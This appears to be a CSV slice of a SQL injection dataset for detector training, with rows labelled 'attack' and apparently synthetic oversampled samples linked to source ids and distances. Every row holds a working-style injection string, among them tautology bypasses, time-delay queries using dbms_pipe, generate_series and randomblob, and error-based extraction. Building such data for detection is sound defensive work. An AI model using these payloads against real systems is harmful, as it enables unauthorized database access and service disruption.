id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000379,attack,boolean,"1 where 4468  =  4468 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001242,0.1056473706005295
SMOTE_000380,attack,boolean,"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",nearest_attack_euclidean,R001033,1.7095278030005752
SMOTE_000381,attack,boolean,select * from users where id  =  1 <@.. or 1  =  1 -- 1,nearest_attack_euclidean,R000113,0.07923276633139889
SMOTE_000382,attack,boolean,"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl",nearest_attack_euclidean,R001423,0.6245623834106754
SMOTE_000383,attack,boolean,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",nearest_attack_euclidean,R001055,0.30686144693520073
SMOTE_000384,attack,boolean,"1' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000833,0.2690677118758857
SMOTE_000385,attack,boolean,"1'  )   as ycsr where 2238  =  2238 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000285,0.1235311736369259
SMOTE_000386,attack,boolean,"-7749"" or   (  2689  =  7481  )  *7481",nearest_attack_euclidean,R001259,0.7237902659307843
SMOTE_000387,attack,boolean,1   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   9452  =  9452,nearest_attack_euclidean,R001121,1.413002776972552
SMOTE_000388,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000682,0.32497022094725403
SMOTE_000389,attack,boolean,"1%""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000808,0.8531926274817814
SMOTE_000390,attack,boolean,"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001278,1.0092786656637804
SMOTE_000391,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000415,0.9122376021354992
SMOTE_000392,attack,boolean,"1""  )   where 5698  =  5698 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000272,0.32961404574854836
SMOTE_000393,attack,boolean,"1   )    )    as vzgo where 6281  =  6281 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001199,0.42519432664712886
SMOTE_000394,attack,boolean,"-1907""   )    )    or 2782  =  3591",nearest_attack_euclidean,R000620,0.07813732226230424
SMOTE_000395,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R001020,0.37412051867858803
SMOTE_000396,attack,boolean,-9054   )    )     )   or 9323  =  9323#,nearest_attack_euclidean,R001388,0.9302827980372723
SMOTE_000397,attack,boolean,-8187'   )    )     )   or 1698  =  2823#,nearest_attack_euclidean,R000566,0.5984871819294066
SMOTE_000398,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000480,0.6700983435747773
SMOTE_000399,attack,boolean,"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",nearest_attack_euclidean,R000576,0.747327334668883
SMOTE_000400,attack,boolean,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,nearest_attack_euclidean,R000063,0.05508918187340431
SMOTE_000401,attack,boolean,-9509'   )    )     )   or 1091  =  5477 and    (    (     (  'gsmz'  =  'gsmz,nearest_attack_euclidean,R000738,0.38185927623217086
SMOTE_000402,attack,boolean,"1"" where 4652  =  4652 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000907,0.5874455063383289
SMOTE_000403,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000991,0.035774053936333795
SMOTE_000404,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000479,0.37180978860919883
SMOTE_000405,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000414,0.466424902129368
SMOTE_000406,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""dacx""  =  ""dacx",nearest_attack_euclidean,R000902,0.18360272994926918
SMOTE_000407,attack,boolean,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001008,0.8892887694795667
SMOTE_000408,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000872,0.006319315947613497
SMOTE_000409,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000300,0.030762371438050676
SMOTE_000410,attack,boolean,"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- zimf",nearest_attack_euclidean,R000286,0.16620169232753357
SMOTE_000411,attack,boolean,or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000015,0.32436704331804855
SMOTE_000412,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001305,0.018118947518660066
SMOTE_000413,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R000336,0.6538830020606492
SMOTE_000414,attack,boolean,"1%'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001417,0.047395653169185877
SMOTE_000415,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",nearest_attack_euclidean,R001318,0.805976774079607
SMOTE_000416,attack,boolean,"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001179,0.037481286828280044
SMOTE_000417,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R001178,0.40876001704849674
SMOTE_000418,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000050,0.12001679300099327
SMOTE_000419,attack,boolean,"1"" where 9973  =  9973 and 2006  =  2006",nearest_attack_euclidean,R000454,0.5102991639001238
SMOTE_000420,attack,boolean,"-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup",nearest_attack_euclidean,R001502,1.1495249875445002
SMOTE_000421,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000563,0.5239260646518019
SMOTE_000422,attack,boolean,"-8454"" or 6872  =  6872",nearest_attack_euclidean,R001407,0.007620602327208398
SMOTE_000423,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000532,0.38455086339516137
SMOTE_000424,attack,boolean,"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001534,0.5954927861938433
SMOTE_000425,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001091,0.20096369740372735
SMOTE_000426,attack,boolean,"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001122,0.16283089003146967
SMOTE_000427,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000404,0.6244061369286092
SMOTE_000428,attack,boolean,"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001379,0.2500991481901283
SMOTE_000429,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",nearest_attack_euclidean,R001318,0.2073343879452215
SMOTE_000430,attack,boolean,"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000328,0.26775420845401016
SMOTE_000431,attack,boolean,-4208%'   )    )     )   or 1133  =  9010--,nearest_attack_euclidean,R001420,0.2913366525051551
SMOTE_000432,attack,boolean,"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",nearest_attack_euclidean,R001165,0.48813576416913895
SMOTE_000433,attack,boolean,"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000243,0.010459413140470811
SMOTE_000434,attack,boolean,"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",nearest_attack_euclidean,R001500,0.644530652496105
SMOTE_000435,attack,boolean,end and 'icny' like 'icny,nearest_attack_euclidean,R000853,0.9007414523696943
SMOTE_000436,attack,boolean,"1' where 4880  =  4880 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000871,0.4863331761603035
SMOTE_000437,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R001095,0.21903333452623314
SMOTE_000438,attack,boolean,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000531,0.008917810797130133
SMOTE_000439,attack,boolean,"1%""  )   and elt  (  4249  =  4249,7259  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001368,0.16639256022334198
SMOTE_000440,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""ulfr"" like ""ulfr",nearest_attack_euclidean,R000153,0.014551393991078755
SMOTE_000441,attack,boolean,"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",nearest_attack_euclidean,R000976,0.5304706839091268
SMOTE_000442,attack,boolean,"1%""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000219,0.1364018211655678
SMOTE_000443,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000931,0.47412081485139507
SMOTE_000444,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000298,0.2063136231014158
SMOTE_000445,attack,boolean,"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",nearest_attack_euclidean,R000924,0.7559359634284532
SMOTE_000446,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000916,0.12311484716729017
SMOTE_000447,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000921,0.33914507204754707
SMOTE_000448,attack,boolean,"1'||  (  select 'ftey' where 1363  =  1363 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",nearest_attack_euclidean,R000162,0.6325714206849226
SMOTE_000449,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000316,0.5125049431534213
SMOTE_000450,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000580,0.12961533146451745
SMOTE_000451,attack,boolean,"-9557%""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000819,1.234171441034994
SMOTE_000452,attack,boolean,"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl",nearest_attack_euclidean,R001200,0.7859855925001059
SMOTE_000453,attack,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1,nearest_attack_euclidean,R000013,0.22380061925334005
SMOTE_000454,attack,boolean,"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",nearest_attack_euclidean,R000246,0.13640999720644542
SMOTE_000455,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",nearest_attack_euclidean,R001332,0.0680233783507466
SMOTE_000456,attack,boolean,"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",nearest_attack_euclidean,R000380,0.3409929923895598
SMOTE_000457,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",nearest_attack_euclidean,R000311,0.11983170390920583
SMOTE_000458,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",nearest_attack_euclidean,R001347,0.11098176459517639
SMOTE_000459,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'ujcx'  =  'ujcx",nearest_attack_euclidean,R000688,0.288385246138169
SMOTE_000460,attack,boolean,"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000796,0.32925144192434497
SMOTE_000461,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R001159,0.617215394377513
SMOTE_000462,attack,boolean, )   or   (  a  =  a,nearest_attack_euclidean,R000051,0.39782006559228167
SMOTE_000463,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""dacx""  =  ""dacx",nearest_attack_euclidean,R000902,0.026780610064591828
SMOTE_000464,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000512,1.5149658590270694
SMOTE_000465,attack,boolean,"1%""  )   and   (  3020  =  3020  )  *6703 and   (  ""%""  =  """,nearest_attack_euclidean,R000175,1.0356130236214396
SMOTE_000466,attack,boolean," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",nearest_attack_euclidean,R000016,0.17884897921997342
SMOTE_000467,attack,boolean,1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,nearest_attack_euclidean,R000572,0.6987601777943327
SMOTE_000468,attack,boolean,"1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000637,0.5193602568746823
SMOTE_000469,attack,boolean,"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",nearest_attack_euclidean,R000947,0.04770557487525456
SMOTE_000470,attack,boolean,"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R001465,0.283720100200703
SMOTE_000471,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'jhxh'  =  'jhxh",nearest_attack_euclidean,R001243,0.30610766881197954
SMOTE_000472,attack,boolean,"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R001432,1.3446997485567718
SMOTE_000473,attack,boolean,1  )   and 3659  =  5475 and   (  8949  =  8949,nearest_attack_euclidean,R000478,0.24407314969135563
SMOTE_000474,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000417,0.21488853153028334
SMOTE_000475,attack,boolean,"1 where 9898  =  9898 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R001438,0.13221362992213884
SMOTE_000476,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R001193,0.0
SMOTE_000477,attack,boolean,"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000372,0.24358646279720972
SMOTE_000478,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000613,0.590894138359591
SMOTE_000479,attack,boolean,1'   )    )     )   and 5615  =  5458--,nearest_attack_euclidean,R000354,0.8686138721747534
SMOTE_000480,attack,boolean,"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""zzkc""  =  ""zzkc",nearest_attack_euclidean,R001549,0.5758482777907653
SMOTE_000481,attack,boolean," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.5146296472360603
SMOTE_000482,attack,boolean,1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000949,2.052200990009815e-05
SMOTE_000483,attack,boolean,"-7146"" where 6431  =  6431 or 8548  =  5549--",nearest_attack_euclidean,R001077,0.6662975668046064
SMOTE_000484,attack,boolean,"1%"" and 7533  =  7533 and ""%""  =  """,nearest_attack_euclidean,R001458,1.072356040182927
SMOTE_000485,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'jhxh'  =  'jhxh",nearest_attack_euclidean,R001243,0.2495263186812188
SMOTE_000486,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000344,0.9266913662880166
SMOTE_000487,attack,boolean,1%' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',nearest_attack_euclidean,R000169,0.10385340883963905
SMOTE_000488,attack,boolean,-3849  )   or 5580  =  3442--,nearest_attack_euclidean,R000485,0.028785514643411107
SMOTE_000489,attack,boolean,1'  )   and 9198  =  9198--,nearest_attack_euclidean,R000161,0.3255372017948457
SMOTE_000490,attack,boolean,"1""  )   where 4426  =  4426 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R001406,0.6332025840949824
SMOTE_000491,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000916,0.12690170007617094
SMOTE_000492,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000935,0.22214863131914897
SMOTE_000493,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R001237,0.12927370159146606
SMOTE_000494,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000494,0.3117053871517588
SMOTE_000495,attack,boolean,admin'  )   or   (  '1'  =  '1'#,nearest_attack_euclidean,R000098,2.1685912552347815
SMOTE_000496,attack,boolean,1'   )    )     )   and 5615  =  5458--,nearest_attack_euclidean,R000354,0.7345104013405016
SMOTE_000497,attack,boolean,"-4319""  )   where 7534  =  7534 or 8246  =  3217",nearest_attack_euclidean,R001160,0.20207246356896325
SMOTE_000498,attack,boolean,"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001151,1.1730280729224047
SMOTE_000499,attack,boolean,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",nearest_attack_euclidean,R000984,0.38938459137531073
SMOTE_000500,attack,boolean,"-7306"" or 2081  =  6847",nearest_attack_euclidean,R001130,0.06767112606724612
